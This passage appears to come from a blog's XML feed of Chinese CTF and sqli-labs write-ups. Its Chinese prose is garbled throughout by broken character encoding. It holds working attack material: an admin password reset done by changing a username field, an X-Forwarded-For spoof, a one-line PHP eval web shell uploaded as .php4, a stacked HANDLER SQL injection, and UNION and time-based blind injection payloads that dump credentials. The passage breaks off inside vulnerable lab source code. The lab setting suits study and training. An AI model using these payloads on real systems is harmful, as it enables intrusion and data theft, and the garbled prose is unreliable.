alt="123"><br>personalÂäüËÉΩÁÇπÔºö<br>ËøôÈáåÊØîËæÉÂèØ‰ª•ÁöÑÂú∞ÊñπÊòØcookieÁöÑuserÔºåÂ∫îËØ•ÊòØMD5Âä†ÂØÜÔºåËß£ÂØÜÈúÄË¶Å‰ªòË¥πÔºåÊöÇÊó∂‰∏çËÄÉËôë„ÄÇËøòÊúâÂ∞±ÊòØ<strong>uid</strong>ÂÄº„ÄÇ<br>Áõ¥Êé•Êîπ‰∏∫1ÊòØ‰∏çÂÖÅËÆ∏ÁöÑÔºåÊâæÂÖ∂‰ªñÊÄùË∑Ø„ÄÇÁúãËÉΩ‰∏çËÉΩÊâæÂà∞‰∏çÈúÄË¶ÅÂ∏¶cookie-userÁöÑÂåÖ<br><img src="https://img-blog.csdnimg.cn/13e8f73a143545dbbf0c9b6ab04bb330.png" alt="2"></p><p>ÁôªÂá∫‰πãÂêéÁúãÊâæÂõûÂØÜÁ†ÅÂäüËÉΩÁÇπ„ÄÇ<br>Áî±‰∫éÊàëÁü•ÈÅìtestÁî®Êà∑ÁöÑ‰ø°ÊÅØÔºåÁõ¥Êé•ËæìÂÖ•<br><img src="https://img-blog.csdnimg.cn/44ed7431b53547d8aac7f20e35791019.png" alt="123"><br>Ëøô‰∏™ÂåÖÁöÑËØ¶ÊÉÖÂ¶Ç‰∏ãÔºö‰ªñÊ≤°ÊúâËøõË°åuserÈ™åËØÅÂêéÈù¢ÊúâÂ∏åÊúõ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/a57eb39e769e437db01e532a5e5fd17d.png" alt="5"><br>‰∏ãÈù¢Ëøô‰∏™ÊòØËæìÂÖ•Êñ∞ÂØÜÁ†ÅÁöÑÂåÖÔºö</p><p><img src="https://img-blog.csdnimg.cn/5f729b4838de4ca384d994ffd06da6a4.png" alt="4"><br>Âú®ËøôÈáåÂ∞ùËØïÊääusernameÊîπ‰∏∫adminÔºåÊàêÂäü‰øÆÊîπadminÂØÜÁ†Å<br><img src="https://img-blog.csdnimg.cn/5c48c75714ab4dbbab310d677fe9ee7b.png" alt="5"><br>ÈöèÂêéÊàêÂäüÁôªÂΩïadminË¥¶Âè∑„ÄÇ<br><img src="https://img-blog.csdnimg.cn/699097f08553466ca469704221d959ca.png" alt="1"><br>‰ΩøÁî®manageÂäüËÉΩÁÇπÂèëÁé∞IP‰∏çË¢´ÂÖÅËÆ∏„ÄÇ<br>Áõ¥Êé•X-Forwarded-For: 127.0.0.1ÔºåÂá∫Áé∞ÁïåÈù¢<br><img src="https://img-blog.csdnimg.cn/8826e8d89a444c78ae6bf348ebc53225.png" alt="2"></p><p>Êü•ÁúãÊ∫ê‰ª£Á†ÅÂèëÁé∞ÂèØÁñë<br><img src="https://img-blog.csdnimg.cn/8af6010afbe345ffbf0c271092bfab0c.png" alt="1"></p><p>ËØïËØïÊñá‰ª∂‰∏ä‰º†<strong>index.php?module&#x3D;filemanage&amp;do&#x3D;upload</strong>ÔºåÂºÄÂßãÊñá‰ª∂‰∏ä‰º†ÁªïËøá‰∫Ü„ÄÇ<br>‰∏ä‰º†ÊôÆÈÄöÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/0d3d7f7d4fb5489589b4ec2c5c1a4836.png" alt="1"><br>‰∏ä‰º†phpÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/6b49b925f1cd438188b1cc57f1273f96.png" alt="1"><br>ÁªèËøá‰∏ÄÁï™ÊäòËÖæÔºåËØ•Êñá‰ª∂ÂêéÁºÄphp4,‰∏ä‰º†Êñá‰ª∂ÂÜÖÂÆπ<code>&lt;script language=&#39;php&#39;&gt;alert(@eval($_POST[1]))&lt;script&gt;</code><br>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/9e5e3e5165bc4e4da1937253f9808910.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ÊîªÈò≤‰∏ñÁïå </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLÊ≥®ÂÖ•‰πãHandlerÂëΩ‰ª§ÂíåÂ†ÜÂè†Ê≥®ÂÖ•</title>
      <link href="/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="HandlerÂëΩ‰ª§"><a href="#HandlerÂëΩ‰ª§" class="headerlink" title="HandlerÂëΩ‰ª§"></a>HandlerÂëΩ‰ª§</h2><h3 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h3><p>   mysqlÈô§ÂèØ‰ΩøÁî®selectÊü•ËØ¢Ë°®‰∏≠ÁöÑÊï∞ÊçÆÔºå‰πüÂèØ‰ΩøÁî®handlerËØ≠Âè•ÔºåËøôÊù°ËØ≠Âè•‰ΩøÊàë‰ª¨ËÉΩÂ§ü‰∏ÄË°å‰∏ÄË°åÁöÑÊµèËßà‰∏Ä‰∏™Ë°®‰∏≠ÁöÑÊï∞ÊçÆÔºå‰∏çËøáhandlerËØ≠Âè•Âπ∂‰∏çÂÖ∑Â§áselectËØ≠Âè•ÁöÑÊâÄÊúâÂäüËÉΩ„ÄÇÂÆÉÊòØmysql‰∏ìÁî®ÁöÑËØ≠Âè•ÔºåÂπ∂Ê≤°ÊúâÂåÖÂê´Âà∞SQLÊ†áÂáÜ‰∏≠„ÄÇ<br>    HANDLERËØ≠Âè•Êèê‰æõÈÄöÂæÄË°®ÁöÑÁõ¥Êé•ÈÄöÈÅìÁöÑÂ≠òÂÇ®ÂºïÊìéÊé•Âè£ÔºåÂèØ‰ª•Áî®‰∫éMyISAMÂíåInnoDBË°®„ÄÇ </p><h3 id="Âü∫Êú¨ËØ≠Ê≥ï"><a href="#Âü∫Êú¨ËØ≠Ê≥ï" class="headerlink" title="Âü∫Êú¨ËØ≠Ê≥ï"></a>Âü∫Êú¨ËØ≠Ê≥ï</h3><p>HANDLER tbl_name OPEN [ [AS] alias]</p><blockquote><p>HANDLER tbl_name READ index_name { &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; } (value1,value2,‚Ä¶)<br>[ WHERE where_condition ] [LIMIT ‚Ä¶ ]<br>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>[ WHERE where_condition ] [LIMIT ‚Ä¶ ]<br>HANDLER tbl_name READ { FIRST | NEXT }<br>[ WHERE where_condition ] [LIMIT ‚Ä¶ ]<br>HANDLER tbl_name CLOSE</p></blockquote><p>ÈÄöËøáHANDLER tbl_name OPENÊâìÂºÄ‰∏ÄÂº†Ë°®ÔºåÊó†ËøîÂõûÁªìÊûúÔºåÂÆûÈôÖ‰∏äÊàë‰ª¨Âú®ËøôÈáåÂ£∞Êòé‰∫Ü‰∏Ä‰∏™Âêç‰∏∫tb1_nameÁöÑÂè•ÊüÑ„ÄÇ<br>    ÈÄöËøáHANDLER tbl_name READ FIRSTËé∑ÂèñÂè•ÊüÑÁöÑÁ¨¨‰∏ÄË°åÔºåÈÄöËøáREAD NEXT‰æùÊ¨°Ëé∑ÂèñÂÖ∂ÂÆÉË°å„ÄÇÊúÄÂêé‰∏ÄË°åÊâßË°å‰πãÂêéÂÜçÊâßË°åNEXT‰ºöËøîÂõû‰∏Ä‰∏™Á©∫ÁöÑÁªìÊûú„ÄÇ<br>    ÈÄöËøáHANDLER tbl_name CLOSEÊù•ÂÖ≥Èó≠ÊâìÂºÄÁöÑÂè•ÊüÑ„ÄÇ</p><pre><code>ÈÄöËøáÁ¥¢ÂºïÂéªÊü•ÁúãÁöÑËØùÂèØ‰ª•ÊåâÁÖß‰∏ÄÂÆöÁöÑÈ°∫Â∫èÔºåËé∑ÂèñË°®‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇÈÄöËøáHANDLER tbl_name READ index_name FIRSTÔºåËé∑ÂèñÂè•ÊüÑÁ¨¨‰∏ÄË°åÔºàÁ¥¢ÂºïÊúÄÂ∞èÁöÑ‰∏ÄË°åÔºâÔºåNEXTËé∑Âèñ‰∏ã‰∏ÄË°åÔºåPREVËé∑ÂèñÂâç‰∏ÄË°åÔºåLASTËé∑ÂèñÊúÄÂêé‰∏ÄË°åÔºàÁ¥¢ÂºïÊúÄÂ§ßÁöÑ‰∏ÄË°åÔºâ„ÄÇÈÄöËøáÁ¥¢ÂºïÂàóÊåáÂÆö‰∏Ä‰∏™ÂÄºÔºåÂèØ‰ª•ÊåáÂÆö‰ªéÂì™‰∏ÄË°åÂºÄÂßã„ÄÇÈÄöËøáHANDLER tbl_name READ index_name = valueÔºåÊåáÂÆö‰ªéÂì™‰∏ÄË°åÂºÄÂßãÔºåÈÄöËøáNEXTÁªßÁª≠ÊµèËßà„ÄÇ</code></pre><p><a href="https://blog.csdn.net/jesseyoung/article/details/40785137">ÂèÇËÄÉÈìæÊé•</a></p><h2 id="Â†ÜÂè†Ê≥®ÂÖ•ÂéüÁêÜ"><a href="#Â†ÜÂè†Ê≥®ÂÖ•ÂéüÁêÜ" class="headerlink" title="Â†ÜÂè†Ê≥®ÂÖ•ÂéüÁêÜ"></a>Â†ÜÂè†Ê≥®ÂÖ•ÂéüÁêÜ</h2><p>Â†ÜÂè†Ê≥®ÂÖ•ÂéüÁêÜ</p><p>Â†ÜÂè†Ê≥®ÂÖ•ÔºåÈ°æÂêçÊÄù‰πâÔºåÂ∞±ÊòØÂ∞ÜËØ≠Âè•Â†ÜÂè†Âú®‰∏ÄËµ∑ËøõË°åÊü•ËØ¢<br>ÂéüÁêÜÂæàÁÆÄÂçïÔºåmysql_multi_query() ÊîØÊåÅÂ§öÊù°sqlËØ≠Âè•ÂêåÊó∂ÊâßË°åÔºåÂ∞±ÊòØ‰∏™;ÂàÜÈöîÔºåÊàêÂ†ÜÁöÑÊâßË°åsqlËØ≠Âè•Ôºå‰æãÂ¶Ç</p><blockquote><p>select * from users;show databases; </p></blockquote><p>Â∞±ÂêåÊó∂ÊâßË°å‰ª•‰∏ä‰∏§Êù°ÂëΩ‰ª§ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Â¢ûÂà†ÊîπÊü•ÔºåÂè™Ë¶ÅÊùÉÈôêÂ§ü.<br>‰ΩÜÊòØËøôÁßçÊÉÖÂÜµÂæàÂ∞ëËßÅ„ÄÇ</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/19719c3bfc764820ad5a2b9957f0839e.png" alt="1"><br>Êú¨È¢òÂèØ‰ª•ÈááÁî®Â†ÜÂè†Ê≥®ÂÖ•<br><img src="https://img-blog.csdnimg.cn/8b7594e3e31442b7a0d718c619e1efd0.png" alt="1"><br>ÂõûÊòæÁªìÊûú<br><img src="https://img-blog.csdnimg.cn/1d5ed6be76614f47a0b8e2fe2e49579e.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/46eed84728fa4bfebb41527d8d279a42.png" alt="3"><br>ËøáÊª§ÁöÑÂáΩÊï∞Â§™Â§ö‰∫ÜÔºåÊääselect‰πüËøáÊª§‰∫ÜÔºåÂ§ßÂ∞èÂÜô‰∏çË°åÔºåÂèåÂÜô‰∏çË°å„ÄÇÊ†πÊçÆÂ∏àÂÇÖ‰ª¨ÁöÑËÆ≤Ëß£‰∫ÜËß£Âà∞ÔºåHandlerÂú®Ëøô‰∏™È¢ò‰∏≠ÂèØ‰ª•‰ΩøÁî®ÔºåÊ†πÊçÆhandlerÂëΩ‰ª§ÁöÑÊ†ºÂºèËæìÂÖ•<code>1&#39;;Handler FlagHere OPEN;Handler FlagHere read first;Handler FlagHere close;#</code><br>ÊãøÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/7137dd4295444e049d06c952d5a736e5.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2023/03/13/sqli-labs/"/>
      <url>/2023/03/13/sqli-labs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h2><p>Áü•ÈÅìÈúÄË¶ÅÈó≠Âêà‰ªÄ‰πàÁ¨¶Âè∑ÔºåÊØîÂ¶ÇËøôÂÖ≥Èó≠ÂêàÊòØ**‚Äô)**</p><blockquote><p>ÁàÜÂá∫ÊúâÂì™‰∫õ‰ΩçÁΩÆÂèØ‰ª•ËøõË°åËæìÂá∫Êï∞ÊçÆ <code>1&#39;) order by 3--+</code></p><p>Êü•ÁúãÊï∞ÊçÆÂ∫ìÂêçÂ≠ó <code>1&#39;) union select 1,2,database()--+</code></p><p>ÁàÜÁ†¥Ë°®ÂêçÔºö <code>-1&#39;) union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p><p>ÁàÜÁ†¥ÂàóÂêçÔºö <code>1&#39;) union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p><p>ÁàÜÁ†¥Êï∞ÊçÆÔºö <code>1&#39;) union select 1,2,group_concat(id,username,password) FROM users--+</code></p></blockquote><h2 id="less-04"><a href="#less-04" class="headerlink" title="less -04"></a>less -04</h2><p>ÈÅá‰∏äÈ¢ò‰∏çÂêåÁöÑÊòØËøôÊ¨°Èó≠ÂêàÊòØ**‚Äù)**</p><h2 id="less-9-Êó∂Èó¥Áõ≤Ê≥®"><a href="#less-9-Êó∂Èó¥Áõ≤Ê≥®" class="headerlink" title="less-9(Êó∂Èó¥Áõ≤Ê≥®)"></a>less-9(Êó∂Èó¥Áõ≤Ê≥®)</h2><p>Êó†ÂõûÊòæÔºåÈááÁî®<strong>Êó∂Èó¥Áõ≤Ê≥®</strong>Âà§Êñ≠ÂØπÈîô<br> <strong>Ê≥®ÊÑèÔºö</strong><br> ÈááÁî®Êó∂Èó¥Áõ≤Ê≥®Êó∂ÈÖçÂêàifËØ≠Âè•ÂèØ‰ª•Áü•ÈÅìÂâçËæπÁöÑÈó≠ÂêàÁ¨¶Âè∑ÊòØ‰ªÄ‰πàÔºåÂ∞±ËøôÈ¢òÊù•ËØ¥ÈááÁî®<code>if(1=2,1,sleep(2))--+</code><br>ÊÑèÊÄùÂ∞±ÊòØÂâçËæπ<strong>1&#x3D;2</strong>Â¶ÇÊûúÊ≠£Á°ÆÔºå‰æø‰ºöÊâßË°å1ÔºåÂê¶ÂàôÊâßË°åsleep(2)„ÄÇ<strong>sleep(2)<strong>ÊÑèÊÄùÂ∞±ÊòØÂª∂Áºì‰∏§ÁßíÔºåËøôÊ†∑ÈÄöËøáÊó∂Èó¥Â∞±ÂèØ‰ª•Âà§Êñ≠Âá∫Êàë‰ª¨ÂâçËæπÂøÖÂíåÁ¨¶Âè∑‰ΩøÁî®ÁöÑÂØπÈîôÊÉÖÂÜµ„ÄÇ<br>Êú¨È¢òÂä†ËΩΩ<code>http://localhost:1000/sqli-labs/Less-9/?id=-1&#39; or if(1=2,1,sleep(2))--+</code>ÂèØ‰ª•ÂèëÁé∞Âª∂Áºì‰∏§ÁßíÊâçËæìÂá∫ÁªìÊûúÔºåËØ¥ÊòéÊ≠§ËØ≠Âè•Ê≠£Á°ÆÔºå‰πüÂ∞±ÊòØÈó≠ÂêàÁ¨¶Âè∑‰ΩøÁî®Ê≠£Á°Æ„ÄÇÊàë‰ª¨Ë¶ÅÂ§öËØïÂá†Ê¨°ÔºåÂπ∂‰∏çÊòØ‰∏ÄÊ¨°Â∞±ËÉΩÂà§Êñ≠Âá∫ÁöÑ„ÄÇ<br><strong>Âà§Êñ≠Êï∞ÊçÆÂ∫ìÂêç</strong><br>Ê¨ßÂÖãÔºå‰∏ãÈù¢Êõ¥È∫ªÁÉ¶ÔºåÁî±‰∫é‰∏ªÈ°µÈù¢‰∏ç‰ºöÊä•ÈîôÔºåÂπ∂‰∏îÂè™ËæìÂá∫</strong>You are in‚Ä¶‚Ä¶‚Ä¶..<strong>ÈÇ£‰πàÂ∞±‰∏Ä‰∏™‰∏Ä‰∏™ÁàÜÁ†¥ÔºåÊâæÂà∞Êï∞ÊçÆÂ∫ìÊúâÂ§öÂ∞ëÂ≠óÁ¨¶‰πüÂ∞±ÊòØ</strong>?id&#x3D;1‚Äô and if(length(database())&gt;8,sleep(2),0) ‚Äì+<strong>Â¶ÇÊûúÂ§ß‰∫é8ÔºåÂ∞±Âª∂Áºì2ÁßíÊ≠£Â∏∏ËøêË°åÔºåÂê¶ÂàôÊ≠£Â∏∏ËøêË°å„ÄÇÁªèËøáÊµãËØïÂèëÁé∞Êï∞ÊçÆÂ∫ìÂêçÈïøÂ∫¶‰∏∫8.<br>ÈïøÂ∫¶Áü•ÈÅì‰∫ÜÂÜçÁàÜÁ†¥ÂÖ∑‰ΩìÂêçÂ≠ó</strong>?id&#x3D;1‚Äô and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),1)‚Äì+</strong><br>Ê≠§‰∏∫Âà§Êñ≠Á¨¨‰∏Ä‰∏™Â≠óÊØçÁöÑasciiÁ†ÅÊòØÂê¶‰∏∫115ÔºåÊúÄÁªàÊâæÂà∞<strong>security</strong><br><strong>Âà§Êñ≠Ë°®Âêç</strong></p><p><code>?id=1‚Äô and if(ascii(substr((select table_name from information_schema.tables where table_schema=‚Äòsecurity‚Äô limit x,y),z,d))=e,sleep(1),0)‚Äì+</code></p><blockquote><p>ÂÖ∂‰∏≠x‰ª£Ë°®Á¨¨x+1‰∏™Ë°®ÔºåyË°®Á§∫Á¨¨x+1ÂæÄÂêéy‰∏™Âçï‰ΩçÁöÑË°®ÔºåzË°®Á§∫Á¨¨Âá†‰∏™Â≠óÊØçÔºådË°®Á§∫zÂæÄÂêéd‰∏™Âçï‰ΩçÁöÑÂ≠óÊØç</p></blockquote><p><strong>Âà§Êñ≠ÂàóÂêç</strong></p><p><code>?id=1‚Äô and If(ascii(substr((select column_name from information_schema.columns where table_name=‚Äòusers‚Äô and table_schema=database() limit x,y),z,d))=105,sleep(2),1)‚Äì+</code></p><blockquote><p>xÔºöÁ¨¨x+1‰∏™ÂàóÔºåyÔºöx+1‰∏™ÂàóÂæÄÂêéy‰∏™Âçï‰ΩçÔºåzÔºöx+1ÂàóÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÊØçÔºådÔºöÁ¨¨‰∏Ä‰∏™Â≠óÊØçÂæÄÂêéÁöÑÁ¨¨z‰∏™Âçï‰Ωç</p></blockquote><p>ÊúÄÂêéÁàÜÊï∞ÊçÆ„ÄÇ</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h2><p>Èó≠ÂêàÁ¨¶Âè∑‰∏∫**‚Äù**</p><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p>ËæìÂÖ•<code>-1&#39; or 1=1#</code>Ê≠£Â∏∏ËøîÂõûÔºåÊü•Âàó„ÄÇ<br><code>admin&#39; order by 2#</code>ÂõûÊòæ<code>admin&#39; order by 3#</code>Êä•Èîô<br><img src="https://img-blog.csdnimg.cn/c20c6ec4119c4561a4426a6ea998b3f6.png" alt="1"><br>Ê¨ßÂÖãÔºåÊé•‰∏ãÊù•Ê≠£Â∏∏Êìç‰Ωú„ÄÇ</p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less 17"></a>less 17</h2><p>ÂàÜÊûêÊ∫êÁ†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//including the Mysql connect parameters.</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// truncation (see comments)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Êà™ÂèñË¥¶Êà∑Ââç15ÁöÑÂ≠óÁ¨¶</span><span class="token punctuation">&#125;</span><span class="token comment">// Stripslashes if magic quotes enabled</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">/*get_magic_quotes_gpc()Âà§Êñ≠ËØ•ÂáΩÊï∞ÊòØÂê¶Ë¢´ÊâìÂºÄÔºåËã•ËØ•ÂáΩÊï∞Ë¢´ÊâìÂºÄÔºå‰ºöËΩ¨‰πâ  ÂçïÂºïÂè∑Ôºà'ÔºâÂèåÂºïÂè∑Ôºà"ÔºâÂèçÊñúÊù†Ôºà\ÔºâÁ©∫Â≠óÁ¨¶Ôºà\0ÔºâÊç¢Ë°åÁ¨¶Ôºà\nÔºâÂõûËΩ¶Á¨¶Ôºà\rÔºâÊ∞¥Âπ≥Âà∂Ë°®Á¨¶Ôºà\tÔºâÂûÇÁõ¥Âà∂Ë°®Á¨¶Ôºà\x0BÔºâ*/</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âà†Èô§ÂèçÊñúÊù†</span><span class="token punctuation">&#125;</span><span class="token comment">// Quote if not a number</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_stringÔºöËΩ¨‰πâÂ≠óÁ¨¶</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// take the variables</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//making sure uname is not injectable</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//logging the connection parameters to a file for analysis.</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// connectivity </span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Êü•ËØ¢ËØ≠Âè•</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_fetch_array() ÂáΩÊï∞‰ªéÁªìÊûúÈõÜ‰∏≠ÂèñÂæó‰∏ÄË°å‰Ωú‰∏∫ÂÖ≥ËÅîÊï∞ÁªÑÔºåÊàñÊï∞Â≠óÊï∞ÁªÑÔºåÊàñ‰∫åËÄÖÂÖºÊúâËøîÂõûÊ†πÊçÆ‰ªéÁªìÊûúÈõÜÂèñÂæóÁöÑË°åÁîüÊàêÁöÑÊï∞ÁªÑÔºåÂ¶ÇÊûúÊ≤°ÊúâÊõ¥Â§öË°åÂàôËøîÂõû false„ÄÇ</span><span class="token comment">//echo $row;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "</span><span class="token comment">#0000ff">';</span><span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//echo 'Your Login name:'. $row1;</span><span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//******************************</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token comment">//echo " You password has been successfully updated " ;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token 